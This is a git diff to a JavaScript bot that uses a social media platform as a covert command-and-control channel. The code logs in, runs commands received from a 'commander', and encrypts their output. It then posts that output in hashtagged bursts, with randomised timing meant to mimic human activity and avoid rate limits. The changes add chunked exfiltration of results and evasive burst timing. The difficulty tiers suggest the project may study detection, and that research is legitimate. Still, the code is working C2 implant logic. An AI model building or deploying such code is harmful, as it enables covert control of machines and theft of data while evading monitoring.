@@ -6,7 +6,7 @@ const fs = require('fs');
 const { login, acceptCookies } = require('./lib/login.js');
 const Commands = require('./lib/commands.js');
 const Encryption = require('./lib/encryption.js');
-const { log, sleep, Difficulty, fetchImage } = require('../utils/utils.js');
+const { log, sleep, Difficulty } = require('../utils/utils.js');
 const { URLS, COMMANDS, COMMUNICATION } = require('../config/constants.js');
 const MESSAGES = require('../config/messages.js');
 
@@ -64,11 +64,26 @@ async function executeCommand(command) {
 async function sendResult(commands, result) {
 	log(result);
 
+	const maxChars = 50; // max 280 but command goes encrypted and with topic
+	const maxPosts = 5; // max 5 posts per burst to avoid api 429 too many requests
+	const burstDelay = burstTime(difficulty); // ms between posts
+	const burst = Math.ceil(result.length / maxChars);
+	const posts = Math.min(burst, maxPosts);
+
+	for (let i = 0; i < posts; i++) {
+		const timestampSample = (Date.now()).toString().slice(8, 12); // make the tweet unique to avoid duplicate error
+		const post = encryption.encrypt(result.slice(i * maxChars, (i + 1) * maxChars));
+		const content = "OUTPUT: " + post + " " + `[${timestampSample}]`;
+		await commands.makePost(content, [`#${TOPIC}`]);
+		log(`Burst: ${burstDelay}ms`);
+		await sleep(burstDelay);
+	}
+
+	// add header to last post to indicate size of result
 	const timestampSample = (Date.now()).toString().slice(8, 12); // make the tweet unique to avoid duplicate error
-	result = encryption.encrypt(result);
-	result = "OUTPUT: " + result + " " + `[${timestampSample}]`;
-	await commands.makePost(result, [`#${TOPIC}`]);
-	// await commands.makePost(result, [`#${TOPIC}`], await fetchImage(IMAGES_API, "../temp/image-bot.png"));
+	const header = encryption.encrypt(posts + " posts");
+	const content = `HEADER: ${header} [${timestampSample}]`;
+	await commands.makePost(content, [`#${TOPIC}`]);
 }
 
 const waitTime = (difficulty) => {
@@ -77,19 +92,25 @@ const waitTime = (difficulty) => {
 			// fixed time interval
 			return COMMUNICATION.CHECK_INTERVAL;
 		case Difficulty.Regular:
+		case Difficulty.Advanced:
 			// random time interval having into consideration the fixed time interval
 			lowerBound = parseInt(COMMUNICATION.CHECK_INTERVAL - COMMUNICATION.CHECK_INTERVAL * 0.2);
 			upperBound = parseInt(COMMUNICATION.CHECK_INTERVAL + COMMUNICATION.CHECK_INTERVAL * 0.8);
 			return Math.floor(Math.random() * (upperBound - lowerBound + 1)) + lowerBound;
-		case Difficulty.Advanced:
-			// TODO: implement
-			// simulate human behavior
-			// two instances:
-			// 1. time to wait until new check
-			// 2. time within an activity burst (p.e.: sending 3 commands in a row, separated by this time (or if only 1 command, then do other things))
-			return 0;
 		default:
 			return COMMUNICATION.CHECK_INTERVAL;
+	}
+}
+
+const burstTime = (difficulty) => {
+	switch (difficulty) {
+		case Difficulty.Dumb:
+		case Difficulty.Regular:
+			return waitTime(difficulty);
+		case Difficulty.Advanced:
+			return COMMUNICATION.BURST_INTERVAL;
+		default:
+			return COMMUNICATION.BURST_INTERVAL;
 	}
 }
 
@@ -123,7 +144,6 @@ let difficulty = Difficulty.Dumb;
 
 	// open communication channel and pass timestamp
 	await commands.makePost(`${COMMUNICATION.OPEN} [${Date.now()}]`, [`#${TOPIC}`]);
-	// await commands.makePost(`${COMMUNICATION.OPEN} [${Date.now()}]`, [`#${TOPIC}`], await fetchImage(IMAGES_API, "../temp/image-bot.png"));
 	nextAction();
 
 	// wait for command from commander
